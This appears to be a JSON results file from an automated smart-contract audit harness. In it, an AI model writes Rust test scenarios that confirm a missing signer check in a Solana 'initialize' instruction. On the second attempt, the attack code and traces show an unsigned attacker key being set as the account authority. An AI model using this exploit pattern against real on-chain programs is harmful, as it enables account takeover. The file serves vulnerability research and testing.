@@ -1,0 +1,207 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: user.authority foi definida como a chave do atacante sem assinatura",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2503,
+        "completion_tokens": 618,
+        "latency_s": 3.58
+      },
+      "raw": "{\n  \"plan\": \"O programa native `initialize` recebe duas contas: `user` (gravável, 32 bytes) e `authority_info`. Ele grava `authority_info.key` em `user.authority` sem verificar `is_signer`. O baseline chama `initialize` com a autoridade legítima assinando, provando que o cenário está montado. O ataque repete a mesma chamada, mas com uma chave de atacante como `authority_info` sem assinatura; o efeito mede se `user.authority` passou a ser a chave do atacante, demonstrando que a conta foi tomada sem consentimento.\",\n  \"scenario\": \"let user_key = Pubkey::new_unique();\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\n\\nlet user_account = account(&env.program_id, &[0u8; 32], None);\\nlet legit_authority_account = wallet(1_000_000_000);\\nlet attacker_authority_account = wallet(1_000_000_000);\\n\\nlet metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(legit_authority, true),\\n];\\nlet ix = env.raw_ix(&(), metas);\\nlet contas = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, legit_authority_account.clone()),\\n];\\nlet baseline = env.baseline(\\\"initialize legitimo com autoridade assinando\\\", &ix, &contas);\\n\\nlet user_after_baseline = after(&baseline, &user_key).clone();\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n];\\nlet attack_ix = env.raw_ix(&(), attack_metas);\\nlet attack_contas = vec![\\n    (user_key, user_after_baseline),\\n    (attacker_authority, attacker_authority_account),\\n];\\nlet r = env.attack(\\\"initialize com autoridade do atacante sem assinatura\\\", &attack_ix, &attack_contas);\\n\\nif r.program_result == ProgramResult::Success {\\n    let authority_gravada = read_pubkey(after(&r, &user_key).data(), 0);\\n    env.effect(\\\"user.authority foi definida como a chave do atacante sem assinatura\\\", authority_gravada == attacker_authority);\\n}\"\n}",
+      "plan": "O programa native `initialize` recebe duas contas: `user` (gravável, 32 bytes) e `authority_info`. Ele grava `authority_info.key` em `user.authority` sem verificar `is_signer`. O baseline chama `initialize` com a autoridade legítima assinando, provando que o cenário está montado. O ataque repete a mesma chamada, mas com uma chave de atacante como `authority_info` sem assinatura; o efeito mede se `user.authority` passou a ser a chave do atacante, demonstrando que a conta foi tomada sem consentimento.",
+      "scenario": "let user_key = Pubkey::new_unique();\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\n\nlet user_account = account(&env.program_id, &[0u8; 32], None);\nlet legit_authority_account = wallet(1_000_000_000);\nlet attacker_authority_account = wallet(1_000_000_000);\n\nlet metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(legit_authority, true),\n];\nlet ix = env.raw_ix(&(), metas);\nlet contas = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, legit_authority_account.clone()),\n];\nlet baseline = env.baseline(\"initialize legitimo com autoridade assinando\", &ix, &contas);\n\nlet user_after_baseline = after(&baseline, &user_key).clone();\n\nlet attack_metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n];\nlet attack_ix = env.raw_ix(&(), attack_metas);\nlet attack_contas = vec![\n    (user_key, user_after_baseline),\n    (attacker_authority, attacker_authority_account),\n];\nlet r = env.attack(\"initialize com autoridade do atacante sem assinatura\", &attack_ix, &attack_contas);\n\nif r.program_result == ProgramResult::Success {\n    let authority_gravada = read_pubkey(after(&r, &user_key).data(), 0);\n    env.effect(\"user.authority foi definida como a chave do atacante sem assinatura\", authority_gravada == attacker_authority);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com autoridade assinando",
+            "result": "Failure(BorshIoError('Unknown'))",
+            "compute_units": 1182,
+            "account_flags": "-w,sr",
+            "ix_head": "",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000000",
+                "digest": "66687aadf862bd77",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com autoridade do atacante sem assinatura",
+            "result": "Failure(BorshIoError('Unknown'))",
+            "compute_units": 1183,
+            "account_flags": "-w,-r",
+            "ix_head": "",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000000",
+                "digest": "66687aadf862bd77",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1182 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: Failed to serialize or deserialize account data: Unknown",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1183 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: Failed to serialize or deserialize account data: Unknown"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo com autoridade assinando' falhou com Failure(BorshIoError('Unknown')); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3013,
+        "completion_tokens": 623,
+        "latency_s": 3.63
+      },
+      "raw": "{\n  \"plan\": \"O baseline falhou porque a instrucao espera dados Borsh (discriminador do enum MyInstruction::Init) e o harness raw_ix com &() nao os fornece. Vou montar a conta user com 32 bytes zerados, dono program_id, e enviar os dados serializados do enum Init (variante 0, sem campos). O baseline usa a autoridade legitima assinando; o ataque repete a mesma instrucao com a autoridade do atacante sem assinar. O efeito mede se user.authority passou a ser a chave do atacante.\",\n  \"scenario\": \"let user_key = Pubkey::new_unique();\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\n\\nlet user_account = account(&env.program_id, &[0u8; 32], None);\\nlet legit_authority_account = wallet(1_000_000_000);\\nlet attacker_authority_account = wallet(1_000_000_000);\\n\\nlet ix_data = vec![0u8];\\n\\nlet metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(legit_authority, true),\\n];\\nlet ix = env.raw_ix(&ix_data, metas);\\nlet contas = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, legit_authority_account.clone()),\\n];\\nlet baseline = env.baseline(\\\"initialize legitimo com autoridade assinando\\\", &ix, &contas);\\n\\nlet user_after_baseline = after(&baseline, &user_key).clone();\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n];\\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\\nlet attack_contas = vec![\\n    (user_key, user_after_baseline),\\n    (attacker_authority, attacker_authority_account),\\n];\\nlet r = env.attack(\\\"initialize com autoridade do atacante sem assinatura\\\", &attack_ix, &attack_contas);\\n\\nif r.program_result == ProgramResult::Success {\\n    let authority_gravada = read_pubkey(after(&r, &user_key).data(), 0);\\n    env.effect(\\\"user.authority foi definida como a chave do atacante sem assinatura\\\", authority_gravada == attacker_authority);\\n}\"\n}",
+      "plan": "O baseline falhou porque a instrucao espera dados Borsh (discriminador do enum MyInstruction::Init) e o harness raw_ix com &() nao os fornece. Vou montar a conta user com 32 bytes zerados, dono program_id, e enviar os dados serializados do enum Init (variante 0, sem campos). O baseline usa a autoridade legitima assinando; o ataque repete a mesma instrucao com a autoridade do atacante sem assinar. O efeito mede se user.authority passou a ser a chave do atacante.",
+      "scenario": "let user_key = Pubkey::new_unique();\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\n\nlet user_account = account(&env.program_id, &[0u8; 32], None);\nlet legit_authority_account = wallet(1_000_000_000);\nlet attacker_authority_account = wallet(1_000_000_000);\n\nlet ix_data = vec![0u8];\n\nlet metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(legit_authority, true),\n];\nlet ix = env.raw_ix(&ix_data, metas);\nlet contas = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, legit_authority_account.clone()),\n];\nlet baseline = env.baseline(\"initialize legitimo com autoridade assinando\", &ix, &contas);\n\nlet user_after_baseline = after(&baseline, &user_key).clone();\n\nlet attack_metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n];\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\nlet attack_contas = vec![\n    (user_key, user_after_baseline),\n    (attacker_authority, attacker_authority_account),\n];\nlet r = env.attack(\"initialize com autoridade do atacante sem assinatura\", &attack_ix, &attack_contas);\n\nif r.program_result == ProgramResult::Success {\n    let authority_gravada = read_pubkey(after(&r, &user_key).data(), 0);\n    env.effect(\"user.authority foi definida como a chave do atacante sem assinatura\", authority_gravada == attacker_authority);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com autoridade assinando",
+            "result": "Success",
+            "compute_units": 9630,
+            "account_flags": "-w,sr",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000000",
+                "digest": "66687aadf862bd77",
+                "post": "0000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com autoridade do atacante sem assinatura",
+            "result": "Success",
+            "compute_units": 14800,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000003",
+                "digest": "71626eb965307659",
+                "post": "0000000000000004000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "user.authority foi definida como a chave do atacante sem assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 9630 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 14800 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: user.authority foi definida como a chave do atacante sem assinatura"
+    }
+  ],
+  "case_id": "HK-REINIT-V",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let authority_info = next_account_info(account_info_iter)?;\n...\nuser.authority = *authority_info.key;",
+    "explanation": "A instrucao define a autoridade da conta `user` a partir de `authority_info.key` sem verificar `authority_info.is_signer`. Qualquer atacante pode passar a chave publica de qualquer conta como `authority_info` e definir-se (ou outra chave arbitraria) como autoridade da conta sem assinar a transacao.",
+    "attack_hypothesis": "Um atacante fornece a conta `user` (ja existente ou recem-criada) e uma `authority_info` cuja chave publica ele controla, sem assinar a transacao. A instrucao grava essa chave como autoridade da conta, permitindo ao atacante assumir o controle da conta `user`."
+  }
+}
